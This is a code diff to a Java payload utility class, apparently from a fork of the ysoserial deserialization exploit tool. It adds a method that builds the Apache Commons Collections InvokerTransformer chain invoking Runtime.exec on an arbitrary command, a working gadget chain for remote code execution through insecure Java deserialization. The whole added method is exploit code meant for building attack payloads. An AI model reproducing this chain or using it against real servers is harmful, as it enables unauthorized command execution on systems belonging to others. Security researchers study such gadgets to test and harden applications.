@@ -4,12 +4,15 @@ package A.R.ysogate.payloads.utils;
 import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;
 import static A.R.ysogate.payloads.config.Config.*;
 
+import java.io.FileOutputStream;
 import java.io.Serializable;
 import java.lang.reflect.Array;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Proxy;
+import java.net.URL;
+import java.net.URLClassLoader;
 import java.util.HashMap;
 import java.util.Map;
 
@@ -24,6 +27,12 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
 import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+import javax.script.ScriptEngineManager;
 
 
 /*
@@ -172,5 +181,14 @@ public class Gadgets {
         Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
         Reflections.setFieldValue(s, "table", tbl);
         return s;
+    }
+
+    public static Transformer[] makeTransformer(String command) throws Exception {
+        Transformer[] transformers;
+        String[]      execArgs = {command};
+
+        transformers = new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}), new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer("exec", new Class[]{String.class}, (Object[]) execArgs), new ConstantTransformer(Integer.valueOf(1))};
+
+        return transformers;
     }
 }
